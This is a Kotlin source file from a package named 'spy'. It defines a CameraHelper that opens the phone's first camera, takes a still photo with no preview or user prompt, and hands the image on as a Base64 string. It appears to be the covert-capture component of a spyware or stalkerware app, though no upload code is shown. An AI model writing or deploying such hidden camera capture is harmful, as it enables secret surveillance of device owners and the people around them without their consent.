package com.gauravhanna.spy

import android.content.Context
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.util.Size
import androidx.core.content.ContextCompat
import java.io.ByteArrayOutputStream
import java.util.*
import java.util.concurrent.TimeUnit

object CameraHelper {
    private const val TAG = "CameraHelper"
    private var cameraManager: CameraManager? = null
    private var cameraDevice: CameraDevice? = null
    private var imageReader: ImageReader? = null
    private var backgroundHandler: Handler? = null
    private var backgroundThread: HandlerThread? = null

    fun takePhoto(context: Context, callback: (String?) -> Unit) {
        startBackgroundThread()
        
        cameraManager = ContextCompat.getSystemService(context, CameraManager::class.java)
        
        try {
            val cameraId = cameraManager?.cameraIdList?.firstOrNull()
            if (cameraId != null) {
                cameraManager?.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        createImageReader(context, callback)
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        camera.close()
                        cameraDevice = null
                        callback(null)
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        Log.e(TAG, "Camera error: $error")
                        camera.close()
                        cameraDevice = null
                        callback(null)
                    }
                }, backgroundHandler)
            } else {
                callback(null)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error opening camera", e)
            callback(null)
        }
    }

    private fun createImageReader(context: Context, callback: (String?) -> Unit) {
        try {
            val characteristics = cameraManager?.getCameraCharacteristics(cameraDevice?.id)
            val configs = characteristics?.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val sizes = configs?.getOutputSizes(android.graphics.ImageFormat.JPEG)
            val size = sizes?.firstOrNull() ?: Size(1920, 1080)

            imageReader = ImageReader.newInstance(size.width, size.height, android.graphics.ImageFormat.JPEG, 2)
            
            imageReader?.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                if (image != null) {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    image.close()
                    
                    // Convert to Base64
                    val base64Image = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                    callback(base64Image)
                    
                    // Clean up
                    closeCamera()
                } else {
                    callback(null)
                }
            }, backgroundHandler)

            // Create capture session
            cameraDevice?.createCaptureSession(
                listOf(imageReader?.surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        val captureRequest = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                        captureRequest?.addTarget(imageReader?.surface)
                        
                        session.capture(captureRequest?.build(), null, backgroundHandler)
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "Capture session configuration failed")
                        callback(null)
                        closeCamera()
                    }
                },
                backgroundHandler
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error creating image reader", e)
            callback(null)
            closeCamera()
        }
    }

    private fun closeCamera() {
        try {
            cameraDevice?.close()
            cameraDevice = null
            imageReader?.close()
            imageReader = null
        } catch (e: Exception) {
            Log.e(TAG, "Error closing camera", e)
        }
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground").apply { start() }
        backgroundHandler = Handler(backgroundThread?.looper)
    }

    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        try {
            backgroundThread?.join(TimeUnit.SECONDS.toMillis(2))
        } catch (e: InterruptedException) {
            Log.e(TAG, "Error stopping background thread", e)
        }
        backgroundThread = null
        backgroundHandler = null
    }
}